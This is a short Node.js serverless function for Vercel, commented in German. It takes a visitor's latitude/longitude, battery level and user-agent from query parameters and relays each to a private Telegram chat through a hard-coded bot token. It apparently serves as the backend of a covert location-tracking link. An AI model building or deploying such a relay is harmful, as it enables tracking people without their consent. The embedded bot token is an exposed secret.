const axios = require('axios');

// Telegram Bot Token und Chat ID (ersetzen mit deinem Token und Chat ID)
const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
const TELEGRAM_CHAT_ID = '7064862085';

// Funktion, um Nachrichten an Telegram zu senden
const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).catch(err => console.error('Error sending message:', err));
};

// Serverless Funktion für Vercel
module.exports = async (req, res) => {
  if (req.method === 'GET' && req.url.startsWith('/send-location')) {
    // Empfang von Standortdaten (lat, lon)
    const { lat, lon } = req.query;

    if (!lat || !lon) {
      return res.status(400).send('Standortdaten fehlen');
    }

    // Nachricht an Telegram senden
    sendToTelegram(`Live Location:\nLatitude: ${lat}\nLongitude: ${lon}`);

    // Antwort an den Client senden
    res.status(200).send('Standort empfangen und Nachricht an Telegram gesendet');
  } else if (req.method === 'GET' && req.url.startsWith('/send-battery')) {
    // Empfang von Batterielevel
    const { level } = req.query;

    if (!level) {
      return res.status(400).send('Batterielevel fehlt');
    }

    // Nachricht an Telegram senden
    sendToTelegram(`Battery Level: ${level}`);

    // Antwort an den Client senden
    res.status(200).send('Batterielevel empfangen und Nachricht an Telegram gesendet');
  } else if (req.method === 'GET' && req.url.startsWith('/send-user-agent')) {
    // Empfang von User-Agent-Daten
    const { id } = req.query;

    if (!id) {
      return res.status(400).send('User-Agent fehlt');
    }

    // Nachricht an Telegram senden
    sendToTelegram(`User Agent: ${id}`);

    // Antwort an den Client senden
    res.status(200).send('User-Agent empfangen und Nachricht an Telegram gesendet');
  } else {
    // Wenn eine ungültige Anfrage kommt
    res.status(404).send('Seite nicht gefunden');
  }
};
